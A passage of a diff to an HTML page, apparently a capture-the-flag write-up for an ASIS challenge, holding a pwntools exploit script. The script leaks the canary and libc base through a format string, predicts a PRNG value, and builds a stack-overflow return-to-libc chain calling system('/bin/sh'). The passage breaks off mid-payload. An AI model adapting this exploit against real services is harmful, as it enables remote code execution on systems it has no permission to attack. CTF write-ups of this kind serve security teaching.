@@ -441,238 +441,237 @@ Flag 1: ASIS{109096cca8948d1cebee782a11d2472b}
   <li>Overwrite the stack canary &amp; return address to launch the return-2-libc attack.</li>
 </ol>
 
-<p>```python exp.py
-from pwn import *
-import time</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">time</span>
 
-<p>HOST = “87.107.123.3”
-PORT = 31337
-libc = ELF(“./libc.so.6”)</p>
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"87.107.123.3"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">31337</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
 
-<p>guess = [124,34,77,-48,68,-36,70,-6,62,99,-86,66,17,58,77,11,53]</p>
+<span class="n">guess</span> <span class="o">=</span> <span class="p">[</span><span class="mi">124</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="mi">77</span><span class="p">,</span><span class="o">-</span><span class="mi">48</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="o">-</span><span class="mi">36</span><span class="p">,</span><span class="mi">70</span><span class="p">,</span><span class="o">-</span><span class="mi">6</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="o">-</span><span class="mi">86</span><span class="p">,</span><span class="mi">66</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="mi">77</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">53</span><span class="p">]</span>
 
-<p>r = remote(HOST, PORT)</p>
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
 
-<h1 id="name-buffer-address--0x603108">name buffer address = 0x603108</h1>
-<h1 id="21p--0xfd---0x1edb0--libc_base">%21$p -0xfd - 0x1edb0 = libc_base</h1>
-<h1 id="17p--canary">%17$p = canary</h1>
+<span class="c"># name buffer address = 0x603108</span>
+<span class="c"># %21$p -0xfd - 0x1edb0 = libc_base</span>
+<span class="c"># %17$p = canary</span>
 
-<p>#send name
-print r.recvuntil(“call you? “)
-name = “%17$p.%21$p.”
-name = name.ljust(60, “A”)
-name = name.ljust(64, “B”)
-assert len(name) == 64
-r.send(name)</p>
+<span class="c">#send name</span>
+<span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"call you? "</span><span class="p">)</span>
+<span class="n">name</span> <span class="o">=</span> <span class="s">"</span><span class="si">%17</span><span class="s">$p.</span><span class="si">%21</span><span class="s">$p."</span>
+<span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>
+<span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span> <span class="s">"B"</span><span class="p">)</span>
+<span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="o">==</span> <span class="mi">64</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
 
-<h1 id="exploit-prng">exploit PRNG</h1>
-<p>s = r.recvuntil(“!\n”)
-print “s:”, s
-seed = u32(s[s.index(name)+64:s.index(“!”):].zfill(4))
-log.success(“seed: “+hex(seed))
-print r.recvuntil(“on it: “)
-lucky_number = 0x0dbdbb1e - seed
-lucky_hex = hex(lucky_number &amp; 0xffffffff)
-lucky_str = lucky_hex[lucky_hex.index(“0x”)+2::].zfill(8)</p>
+<span class="c"># exploit PRNG</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="k">print</span> <span class="s">"s:"</span><span class="p">,</span> <span class="n">s</span>
+<span class="n">seed</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">s</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="o">+</span><span class="mi">64</span><span class="p">:</span><span class="n">s</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">"!"</span><span class="p">):]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"seed: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">seed</span><span class="p">))</span>
+<span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"on it: "</span><span class="p">)</span>
+<span class="n">lucky_number</span> <span class="o">=</span> <span class="mh">0x0dbdbb1e</span> <span class="o">-</span> <span class="n">seed</span>
+<span class="n">lucky_hex</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">lucky_number</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
+<span class="n">lucky_str</span> <span class="o">=</span> <span class="n">lucky_hex</span><span class="p">[</span><span class="n">lucky_hex</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">"0x"</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">::]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
 
-<p>assert len(lucky_str) == 8
-lucky_byte1 = str(int(lucky_str[6:8:], 16))
-lucky_byte2 = str(int(lucky_str[4:6:], 16))
-lucky_byte3 = str(int(lucky_str[2:4:], 16))
-lucky_byte4 = str(int(lucky_str[0:2:], 16))</p>
+<span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">lucky_str</span><span class="p">)</span> <span class="o">==</span> <span class="mi">8</span>
+<span class="n">lucky_byte1</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">lucky_str</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">8</span><span class="p">:],</span> <span class="mi">16</span><span class="p">))</span>
+<span class="n">lucky_byte2</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">lucky_str</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">6</span><span class="p">:],</span> <span class="mi">16</span><span class="p">))</span>
+<span class="n">lucky_byte3</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">lucky_str</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">:],</span> <span class="mi">16</span><span class="p">))</span>
+<span class="n">lucky_byte4</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">lucky_str</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">))</span>
 
-<p>log.success(“sending luck_number: “+str(lucky_number))
-log.success(hex(seed)+” + “+hex(lucky_number)+” = “+hex(lucky_number+seed))
-r.send(str(lucky_number)+”\n”)</p>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"sending luck_number: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">lucky_number</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span><span class="o">+</span><span class="s">" + "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">lucky_number</span><span class="p">)</span><span class="o">+</span><span class="s">" = "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">lucky_number</span><span class="o">+</span><span class="n">seed</span><span class="p">))</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">lucky_number</span><span class="p">)</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 
-<h1 id="015-to-pass-the-first-16-numbers">0~15 to pass the first 16 numbers</h1>
-<p>for i in range(16):
-    print r.recvuntil(“: “)
-    log.success(“sending: “+str(guess[i]))
-    r.send(str(guess[i])+”\n”)</p>
+<span class="c"># 0~15 to pass the first 16 numbers</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
+    <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"sending: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">guess</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">guess</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 
-<p>payloads = [“44”,#17 byte, v8
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-            lucky_byte1,   # lucky number
-            lucky_byte2,   # lucky number
-            lucky_byte3,   # lucky number
-            lucky_byte4,   # lucky number
-           “1”, # v10 for win
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-           “17”, # i
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-           “0”, # v12_1
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-           “0”, # v12_2
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-            “8”, #name_buf 0x08
-            “49”, #name_buf 0x31
-            “96”, #name_buf 0x60
-            “0”, #name_buf 0x00
-           ]</p>
+<span class="n">payloads</span> <span class="o">=</span> <span class="p">[</span><span class="s">"44"</span><span class="p">,</span><span class="c">#17 byte, v8</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="n">lucky_byte1</span><span class="p">,</span>   <span class="c"># lucky number</span>
+            <span class="n">lucky_byte2</span><span class="p">,</span>   <span class="c"># lucky number</span>
+            <span class="n">lucky_byte3</span><span class="p">,</span>   <span class="c"># lucky number</span>
+            <span class="n">lucky_byte4</span><span class="p">,</span>   <span class="c"># lucky number</span>
+           <span class="s">"1"</span><span class="p">,</span> <span class="c"># v10 for win</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+           <span class="s">"17"</span><span class="p">,</span> <span class="c"># i</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+           <span class="s">"0"</span><span class="p">,</span> <span class="c"># v12_1</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+           <span class="s">"0"</span><span class="p">,</span> <span class="c"># v12_2</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"8"</span><span class="p">,</span> <span class="c">#name_buf 0x08</span>
+            <span class="s">"49"</span><span class="p">,</span> <span class="c">#name_buf 0x31</span>
+            <span class="s">"96"</span><span class="p">,</span> <span class="c">#name_buf 0x60</span>
+            <span class="s">"0"</span><span class="p">,</span> <span class="c">#name_buf 0x00</span>
+           <span class="p">]</span>
 
-<p>payloads[0] = str(len(payloads) + 16)</p>
-<h1 id="sending-payload">sending payload</h1>
-<p>for payload in payloads:
-    print r.recvuntil(“: “)
-    log.success(“sending: “+payload)
-    r.send(payload+”\n”)</p>
+<span class="n">payloads</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payloads</span><span class="p">)</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span>
+<span class="c"># sending payload</span>
+<span class="k">for</span> <span class="n">payload</span> <span class="ow">in</span> <span class="n">payloads</span><span class="p">:</span>
+    <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"sending: "</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 
-<p>s = r.recvuntil(“BBBB”)
-canary = s.split(“.”)[0]
-canary = “0x” + canary[canary.index(“0x”)+2::].rjust(16, “0”)
-libc_base = int(s.split(“.”)[1], 16) - 0xfd - 0x1edb0
-log.success(“canary: “+canary)
-log.success(“libc_base: “+hex(libc_base))</p>
+<span class="n">s</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"BBBB"</span><span class="p">)</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="s">"0x"</span> <span class="o">+</span> <span class="n">canary</span><span class="p">[</span><span class="n">canary</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">"0x"</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">::]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="s">"0"</span><span class="p">)</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xfd</span> <span class="o">-</span> <span class="mh">0x1edb0</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"canary: "</span><span class="o">+</span><span class="n">canary</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
 
-<p>libc.address += libc_base
-pop_rdi_ret = libc_base + 0x2024b # pop rdi, ret
-bin_sh = libc_base + 0x14bc23     # pointer to /bin/sh
-system_addr = libc.symbols[‘system’]</p>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+=</span> <span class="n">libc_base</span>
+<span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2024b</span> <span class="c"># pop rdi, ret</span>
+<span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x14bc23</span>     <span class="c"># pointer to /bin/sh</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
 
-<p>log.success(“pop_rdi_ret: “+hex(pop_rdi_ret))
-log.success(“/bin/sh: “+hex(bin_sh))
-log.success(“system: “+hex(system_addr))</p>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"pop_rdi_ret: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"/bin/sh: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
 
-<p>canary_byte = []
-for i in xrange(2, 17, 2):
-    canary_byte.append( str(int(canary[i:i+2:], 16) ) )</p>
+<span class="n">canary_byte</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">2</span><span class="p">):</span>
+    <span class="n">canary_byte</span><span class="o">.</span><span class="n">append</span><span class="p">(</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">canary</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span> <span class="p">)</span> <span class="p">)</span>
 
-<p>r.send(“y\n”)</p>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"y</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 
-<h1 id="015-to-pass-the-first-16-numbers-1">0~15 to pass the first 16 numbers</h1>
-<p>for i in range(16):
-    print r.recvuntil(“: “)
-    log.success(“sending: “+str(guess[i]))
-    r.send(str(guess[i])+”\n”)</p>
+<span class="c"># 0~15 to pass the first 16 numbers</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
+    <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"sending: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">guess</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">guess</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 
-<p>payloads = [“52”,# will be adjust later
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-            lucky_byte1,   # lucky number
-            lucky_byte2,   # lucky number
-            lucky_byte3,   # lucky number
-            lucky_byte4,   # lucky number
-           “1”, # v10 for win
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-           “17”, # i
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-           “0”, # v12_1
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-           “0”, # v12_2
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-            “8”, #name_buf 0x08
-            “49”, #name_buf 0x31
-            “96”, #name_buf 0x60
-            “0”, #name_buf 0x00
-           “0”, # padding
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-            “168”, #name_buf 0xa8
-            “48”, #name_buf 0x30
-            “96”, #name_buf 0x60
-            “0”, #name_buf 0x00
-           “0”, # padding
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-           canary_byte[7], # canary 1
-           canary_byte[6], # canary 2
-           canary_byte[5], # canary 3
-           canary_byte[4], # canary 4
-           canary_byte[3], # canary 5
-           canary_byte[2], # canary 6
-           canary_byte[1], # canary 7
-           canary_byte[0], # canary 8
-           “0”, # padding1
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-           “0”, # padding2
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-           “0”, # padding3
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-            “0”,#padding
-           str(pop_rdi_ret &amp; 0xff), # pop_rdi_ret
-            str( (pop_rdi_ret » 8 ) &amp; 0xff), # pop_rdi_ret
-            str( (pop_rdi_ret » 16 ) &amp; 0xff), # pop_rdi_ret
-            str( (pop_rdi_ret » 24 ) &amp; 0xff), # pop_rdi_ret
-            str( (pop_rdi_ret » 32 ) &amp; 0xff), # pop_rdi_ret
-            str( (pop_rdi_ret » 40 ) &amp; 0xff), # pop_rdi_ret
-            str( (pop_rdi_ret » 48 ) &amp; 0xff), # pop_rdi_ret
-            str( (pop_rdi_ret » 56 ) &amp; 0xff), # pop_rdi_ret
-           str(bin_sh &amp; 0xff), # bin_sh
-            str( (bin_sh » 8 ) &amp; 0xff), # bin_sh
-            str( (bin_sh » 16 ) &amp; 0xff), # bin_sh
-            str( (bin_sh » 24 ) &amp; 0xff), # bin_sh
-            str( (bin_sh » 32 ) &amp; 0xff), # bin_sh
-            str( (bin_sh » 40 ) &amp; 0xff), # bin_sh
-            str( (bin_sh » 48 ) &amp; 0xff), # bin_sh
-            str( (bin_sh » 56 ) &amp; 0xff), # bin_sh
-           str(system_addr &amp; 0xff), # system_addr
-            str( (system_addr » 8 ) &amp; 0xff), # system_addr
-            str( (system_addr » 16 ) &amp; 0xff), # system_addr
-            str( (system_addr » 24 ) &amp; 0xff), # system_addr
-            str( (system_addr » 32 ) &amp; 0xff), # system_addr
-            str( (system_addr » 40 ) &amp; 0xff), # system_addr
-            str( (system_addr » 48 ) &amp; 0xff), # system_addr
-            str( (system_addr » 56 ) &amp; 0xff), # system_addr
-           ]</p>
+<span class="n">payloads</span> <span class="o">=</span> <span class="p">[</span><span class="s">"52"</span><span class="p">,</span><span class="c"># will be adjust later</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="n">lucky_byte1</span><span class="p">,</span>   <span class="c"># lucky number</span>
+            <span class="n">lucky_byte2</span><span class="p">,</span>   <span class="c"># lucky number</span>
+            <span class="n">lucky_byte3</span><span class="p">,</span>   <span class="c"># lucky number</span>
+            <span class="n">lucky_byte4</span><span class="p">,</span>   <span class="c"># lucky number</span>
+           <span class="s">"1"</span><span class="p">,</span> <span class="c"># v10 for win</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+           <span class="s">"17"</span><span class="p">,</span> <span class="c"># i</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+           <span class="s">"0"</span><span class="p">,</span> <span class="c"># v12_1</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+           <span class="s">"0"</span><span class="p">,</span> <span class="c"># v12_2</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"8"</span><span class="p">,</span> <span class="c">#name_buf 0x08</span>
+            <span class="s">"49"</span><span class="p">,</span> <span class="c">#name_buf 0x31</span>
+            <span class="s">"96"</span><span class="p">,</span> <span class="c">#name_buf 0x60</span>
+            <span class="s">"0"</span><span class="p">,</span> <span class="c">#name_buf 0x00</span>
+           <span class="s">"0"</span><span class="p">,</span> <span class="c"># padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"168"</span><span class="p">,</span> <span class="c">#name_buf 0xa8</span>
+            <span class="s">"48"</span><span class="p">,</span> <span class="c">#name_buf 0x30</span>
+            <span class="s">"96"</span><span class="p">,</span> <span class="c">#name_buf 0x60</span>
+            <span class="s">"0"</span><span class="p">,</span> <span class="c">#name_buf 0x00</span>
+           <span class="s">"0"</span><span class="p">,</span> <span class="c"># padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">7</span><span class="p">],</span> <span class="c"># canary 1</span>
+           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span> <span class="c"># canary 2</span>
+           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span> <span class="c"># canary 3</span>
+           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="c"># canary 4</span>
+           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="c"># canary 5</span>
+           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="c"># canary 6</span>
+           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="c"># canary 7</span>
+           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="c"># canary 8</span>
+           <span class="s">"0"</span><span class="p">,</span> <span class="c"># padding1</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+           <span class="s">"0"</span><span class="p">,</span> <span class="c"># padding2</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+           <span class="s">"0"</span><span class="p">,</span> <span class="c"># padding3</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
+           <span class="nb">str</span><span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># pop_rdi_ret</span>
+            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># pop_rdi_ret</span>
+            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># pop_rdi_ret</span>
+            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># pop_rdi_ret</span>
+            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># pop_rdi_ret</span>
